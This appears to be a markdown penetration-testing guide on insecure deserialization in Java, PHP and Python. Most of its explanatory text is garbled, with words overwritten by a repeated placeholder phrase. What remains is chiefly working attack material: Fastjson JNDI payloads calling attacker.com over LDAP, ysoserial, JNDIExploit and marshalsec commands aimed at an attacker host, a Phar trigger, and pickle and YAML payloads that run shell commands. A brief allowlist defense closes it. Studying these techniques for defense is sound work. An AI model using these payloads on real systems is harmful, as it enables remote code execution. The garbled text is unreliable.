# Web deserialization testing guidance - deserialization testing guidance

> deserialization testing guidance: WooYun deserialization testing guidance | deserialization testing guidance web-injection.md

## deserialization testing guidance、deserialization testing guidance

### 5.1 deserialization testing guidance

```
deserialization testing guidance(deserialization testing guidance) -> deserialization testing guidance -> deserialization testing guidance/deserialization testing guidance -> deserialization testing guidance
```

**deserialization testing guidance**：deserialization testing guidanceRCE = deserialization testing guidance + deserialization testing guidanceclasspath/deserialization testing guidance + deserialization testing guidance(Gadget Chain)

### 5.2 Javadeserialization testing guidance

**deserialization testing guidance**

```
deserialization testing guidance: AC ED 00 05 (hexdeserialization testing guidance)
Base64:   rO0AB (deserialization testing guidance)
deserialization testing guidance: Cookie、ViewState、JMX、RMI、T3deserialization testing guidance、HTTP Body
```

**deserialization testing guidance**

| deserialization testing guidance | deserialization testing guidance | deserialization testing guidance | deserialization testing guidance |
|--------|--------|----------|------|
| Commons-Collections | commons-collections 3.x/4.x | InvokerTransformer | ysoserial |
| Spring | spring-core + spring-beans | MethodInvokeTypeProvider | ysoserial |
| Fastjson | fastjson < 1.2.68 | `@type` autoType | deserialization testing guidance/deserialization testing guidance |
| Jackson | jackson-databind | deserialization testing guidance | ysoserial |
| JNDIdeserialization testing guidance | JDK < 8u191 | LDAP/RMIdeserialization testing guidance | JNDIExploit/marshalsec |

**Fastjsondeserialization testing guidancePayload**

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}

// 1.2.47 deserialization testing guidance
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/","autoCommit":true}}
```

**deserialization testing guidance**

```bash
# ysoserialdeserialization testing guidancepayload
java -jar ysoserial.jar CommonsCollections1 "whoami" | base64

# JNDIdeserialization testing guidance
java -jar JNDIExploit.jar -i attacker_ip

# marshalsecdeserialization testing guidanceLDAP/RMI
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker/#Exploit"
```

### 5.3 PHPdeserialization testing guidance

**deserialization testing guidance**

```
deserialization testing guidance: O:4:"User":2:{s:4:"name";s:5:"admin";s:3:"age";i:25;}
deserialization testing guidance: unserialize(), phar://deserialization testing guidance
```

**deserialization testing guidance**

| deserialization testing guidance | deserialization testing guidance | deserialization testing guidance |
|------|----------|----------|
| `__wakeup()` | unserialize()deserialization testing guidance | deserialization testing guidance→deserialization testing guidance |
| `__destruct()` | deserialization testing guidance | deserialization testing guidance/deserialization testing guidance/deserialization testing guidance |
| `__toString()` | deserialization testing guidance | deserialization testing guidance |
| `__call()` | deserialization testing guidance | deserialization testing guidance |

**POPdeserialization testing guidance**

```
1. deserialization testing guidance: __wakeup()/__destruct() deserialization testing guidance$this->xxxdeserialization testing guidance
2. deserialization testing guidance: deserialization testing guidance__toString()/__call()/__get() deserialization testing guidance
3. deserialization testing guidance: deserialization testing guidancesystem()/eval()/file_put_contents()deserialization testing guidance
4. deserialization testing guidance: deserialization testing guidance
```

**Phardeserialization testing guidance（deserialization testing guidanceunserializedeserialization testing guidance）**

```php
// deserialization testing guidancephar://deserialization testing guidance
file_exists('phar://upload/evil.phar');
is_dir('phar://upload/evil.jpg');      // deserialization testing guidance
```

### 5.4 Pythondeserialization testing guidance

**deserialization testing guidance**

```python
import pickle, yaml, marshal

# pickle - deserialization testing guidance
pickle.loads(data)      # deserialization testing guidance
pickle.load(file)       # deserialization testing guidance

# yaml - deserialization testing guidanceLoader
yaml.load(data)         # deserialization testing guidance(deserialization testing guidance)
yaml.load(data, Loader=yaml.FullLoader)  # deserialization testing guidance

# marshal - deserialization testing guidance
marshal.loads(data)     # deserialization testing guidance
```

**pickle RCE Payload**

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
# deserialization testing guidance:
# pickle.loads(b"cos\nsystem\n(S'whoami'\ntR.")
```

**yaml RCE Payload**

```yaml
!!python/object/apply:os.system ['whoami']
# deserialization testing guidance
!!python/object/new:subprocess.check_output [['whoami']]
```

### 5.5 deserialization testing guidance

```java
// Java: ObjectInputStreamdeserialization testing guidance
ObjectInputStream ois = new ObjectInputStream(input) {
    @Override protected Class< > resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (!allowedClasses.contains(desc.getName())) throw new InvalidClassException("Blocked: " + desc.getName());
        return super.resolveClass(desc);
    }
};
```

- **Java**: deserialization testing guidance(Fastjson/Jackson/Commons-Collections)、deserialization testing guidanceautoType、deserialization testing guidance
- **PHP**: deserialization testing guidanceunserialize()deserialization testing guidance、deserialization testing guidancejson_decodedeserialization testing guidance、deserialization testing guidancephar://deserialization testing guidance
- **Python**: deserialization testing guidance`yaml.safe_load()`deserialization testing guidance`yaml.load()`、deserialization testing guidancepickledeserialization testing guidance、deserialization testing guidanceJSON
- **deserialization testing guidance**: deserialization testing guidance，deserialization testing guidanceJSON；deserialization testing guidance/HMACdeserialization testing guidance

---

